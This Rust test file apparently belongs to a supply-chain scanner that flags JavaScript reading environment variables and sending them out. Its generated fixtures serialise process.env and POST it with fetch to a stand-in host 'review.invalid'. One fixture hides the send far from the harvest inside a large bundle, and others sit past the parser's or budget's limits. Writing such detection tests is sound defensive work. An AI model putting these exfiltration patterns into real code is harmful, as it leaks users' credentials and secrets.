//! BIG-BUNDLE-TAIL, the external review of Oct 20 (REVIEW - FP-GITHUB-SCRIPT v2 and BIG-BUNDLE-TAIL.md): (2) a
//! method's call, whose receiver the follower does not resolve, reaches each function of its name; (3) a text the
//! supply-chain tree did not read whole (the parser refused code V8 compiles, the model's budget ran out) is a cut in
//! the tree's words beside the follower's answer, whatever that answer is; (4) callbacks of one function, each its own
//! `data`, are read in linear time, charged to the call's budget. The texts are inert: nothing here is run; the hosts
//! are `.invalid`.

use crate::budget;
use crate::json::Value;
use crate::pystr;

fn cps(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

/// The follower's answer on `text` with the default budget: (kind, what), or None.
fn followed(text: &str) -> Option<(&'static str, String)> {
    let p = crate::pack::current();
    budget::reset(budget::DEFAULT_STEPS);
    let got = super::local_data_sent_at(&p, &cps(text)).map(|(_, kind, what, _)| (kind, pystr::to_string(&what)));
    budget::take_cut();
    got
}

fn whole() -> Option<(&'static str, String)> {
    Some(("environment", "the whole environment".to_string()))
}

const HARVEST: &str = "reads credentials or the whole environment and sends data over the network";

/// 500 nested brackets: code V8 compiles that the parser refuses (nesting past its bound).
fn nesting() -> String {
    format!("const nesting={}0{};\n", "[".repeat(500), "]".repeat(500))
}

/// The import-time test as the registry asks it (`refused`, `unread`): (reasons, the refusal's reason, the cut).
fn import_unread(text: &str) -> (Vec<String>, Option<String>, Option<String>) {
    let args = Value::obj(vec![("lang", Value::str("js")), ("refused", Value::Bool(true)), ("unread", Value::Bool(true))]);
    match crate::api::call("import_time_risk", &args, &cps(text)) {
        Ok(Value::Arr(a)) => {
            let reasons = match &a[0] {
                Value::Arr(r) => r.iter().map(|v| pystr::to_string(v.as_str().unwrap())).collect(),
                _ => panic!("{:?}", a[0]),
            };
            let refused = match &a[2] {
                Value::Arr(r) => r.get(1).and_then(|v| v.as_str()).map(pystr::to_string),
                _ => None,
            };
            (reasons, refused, a.get(3).and_then(|v| v.as_str()).map(pystr::to_string))
        }
        other => panic!("{other:?}"),
    }
}

/// The review's member-send-{1,2}.js: `a.send(data)`, and n - 1 other objects with a benign `send`.
fn member_send(n: usize) -> String {
    let others: String = (0..n - 1).map(|k| format!("const b{k} = {{send: function send(data) {{ return data; }}}};\n")).collect();
    format!("const a = {{send: function send(data) {{\n  fetch('https://review.invalid/collect', {{method:'POST', body:data}});\n}}}};\n{others}function main() {{\n  const data = JSON.stringify(process.env);\n  a.send(data);\n}}\nmain();\n")
}

/// A method returning its variable `data`, which a function's variable `data` is given (`const data = s.grab()`),
/// and n - 1 other classes' methods of the name returning their own `data`.
fn member_return(n: usize) -> String {
    let others: String = (0..n - 1).map(|k| format!("class T{k} {{ grab() {{ const data = 'x'; return data; }} }}\n")).collect();
    format!("class S {{ grab() {{ const data = JSON.stringify(process.env); return data; }} }}\n{others}function main(s) {{ const data = s.grab(); fetch('https://review.invalid/collect', {{method:'POST', body:data}}); }}\nmain(new S());\n")
}

#[test]
fn a_methods_call_reaches_each_function_of_its_name() {
    for n in [1, 2, 3, 6] {
        assert_eq!(followed(&member_send(n)), whole(), "send, {n} functions of the name");
        assert_eq!(followed(&member_return(n)), whole(), "return, {n} functions of the name");
    }
    // past the parser's bound the follower answers, and the tree's not reading the text is said beside it
    let (reasons, refused, cut) = import_unread(&format!("{}{}", nesting(), member_send(2)));
    assert_eq!(reasons, vec![HARVEST.to_string()]);
    assert_eq!(refused.as_deref(), Some("nesting too deep"));
    assert!(cut.is_some_and(|c| c.starts_with(crate::signs::TREE_UNREAD)));
    // (and a method no function of the script has: nothing)
    assert_eq!(followed(&member_send(1).replace("a.send(data)", "a.post(data)")), None);
}

/// A webpack/ncc-style module of a little over 1 KB of benign code (as flow_tail_tests' bundles).
fn module(k: usize, code: &str) -> String {
    format!("/***/ {k}:\n/***/ ((module, exports, __nccwpck_require__) => {{\n\"use strict\";\n{code}\n/***/ }}),\n\n")
}

/// The review's far-helper.js: module 9001's diag() returns the environment; module 99, a megabyte on, sends it.
fn far_helper() -> String {
    let filler = |k: usize| {
        format!(
            "function normalize{k}(options) {{\n  options = options || {{}};\n  const result = {{ retries: options.retries || 3, name: \"m{k}\" }};\n  return result;\n}}\n\
             class Client{k} {{\n  constructor(base) {{ this.base = base; this.options = normalize{k}({{ retries: {} }}); }}\n}}\n\
             module.exports = {{ Client{k}, normalize{k} }};\n",
            k % 7
        )
    };
    let mut mods = vec![module(9001, "exports.diag = function diag(){const all=JSON.stringify(process.env);return all;};")];
    let mut n = 0;
    let mut k = 0;
    while n < 2_050_000 {
        let m = module(10_000 + k, &filler(10_000 + k));
        n += m.len();
        mods.push(m);
        k += 1;
        if k == 900 {
            mods.push(module(99, "const core=__nccwpck_require__(9001); const payload=core.diag(); fetch('https://review.invalid/collect',{method:'POST',body:payload});"));
        }
    }
    format!("var __webpack_modules__ = ({{\n\n{}}});\nfunction __nccwpck_require__(id) {{ var m = {{ exports: {{}} }}; __webpack_modules__[id](m, m.exports, __nccwpck_require__); return m.exports; }}\n__nccwpck_require__(99);\n", mods.concat())
}

/// The review's stress prefix: a function of 10,000 declarations and 10,000 branches, past the model's budget.
fn stress() -> String {
    let mut out = String::from("function stress(flag){\n");
    out.extend((0..10_000).map(|k| format!("let a{k}=0;\n")));
    out.extend((0..10_000).map(|k| format!("if(flag){{a{k}=1;}}\n")));
    out.push_str("return a0;}\nstress(false);\n");
    out
}

#[test]
fn a_text_the_tree_did_not_read_whole_is_a_cut_beside_the_followers_answer() {
    let bundle = far_helper();
    assert!(bundle.len() > 2_000_000);
    // read by the tree: the split send, and nothing unread
    assert_eq!(import_unread(&bundle), (vec![HARVEST.to_string()], None, None));
    // the parser refuses it (valid code): the follower, which does not see the split, is quiet; the cut says why
    let refused = format!("{}{bundle}", nesting());
    let (reasons, why, cut) = import_unread(&refused);
    assert_eq!((reasons, why.as_deref()), (vec![], Some("nesting too deep")));
    assert_eq!(cut.as_deref(), Some(&*format!("{}the parser refused it at line 1 (nesting too deep); its text alone was read for what it sends", crate::signs::TREE_UNREAD)));
    // past the model's budget (the parser reads it all): the same, in the pass's words
    let past = format!("{}{bundle}", stress());
    assert!(crate::jsflow::supply::refusal(&cps(&past)).is_none());
    let (reasons, why, cut) = import_unread(&past);
    assert_eq!((reasons, why), (vec![], None));
    let cut = cut.expect("a cut");
    assert!(cut.starts_with(&format!("{}the JavaScript cross-file pass stopped", crate::signs::TREE_UNREAD)), "{cut}");
    // asked without `unread`, the call answers as one that ran out, in the tree's words
    let args = Value::obj(vec![("lang", Value::str("js"))]);
    assert!(matches!(crate::api::call("import_time_risk", &args, &cps(&past)), Err(crate::api::CallError::Exhausted)));
    assert_eq!(budget::last_cut(), Some(cut));
    // a text the parser refuses that no runtime runs (a syntax error): the follower's answer, no cut
    let (reasons, why, cut) = import_unread(&format!("{}\nfunction refused( {{\n", member_send(2)));
    assert_eq!(reasons, vec![HARVEST.to_string()]);
    assert!(why.is_some_and(|w| w != "nesting too deep"));
    assert_eq!(cut, None);
}

/// The review's callback-cost-N.js: a function calls its callback 1,000 times, given n callbacks of `data`.
fn callbacks(n: usize) -> String {
    format!(
        "function invoke(cb){{\n{}}}\n{}",
        "cb(process.env);\n".repeat(1000),
        "invoke(data=>fetch('https://review.invalid/x',{method:'POST',body:JSON.stringify(data)}));\n".repeat(n)
    )
}

#[test]
fn callbacks_are_read_in_linear_time_within_the_calls_budget() {
    for n in [3_000, 8_000] {
        let text = callbacks(n);
        let start = std::time::Instant::now();
        assert_eq!(followed(&text), whole(), "{n} callbacks");
        assert!(start.elapsed().as_secs_f64() < 5.0, "{n} callbacks: {:?}", start.elapsed());
        // a small budget runs out: the call answers as one that ran out
        let args = Value::obj(vec![("budget", Value::Int(1_000_000))]);
        assert!(matches!(crate::api::call("local_data_sent_at", &args, &cps(&text)), Err(crate::api::CallError::Exhausted)), "{n}");
    }
    // past the parser's bound (the review's callback-deadline-N.js): found, and the tree's not reading it said
    let (reasons, _, cut) = import_unread(&format!("{}{}", nesting(), callbacks(3_000)));
    assert_eq!(reasons, vec![HARVEST.to_string()]);
    assert!(cut.is_some_and(|c| c.starts_with(crate::signs::TREE_UNREAD)));
}
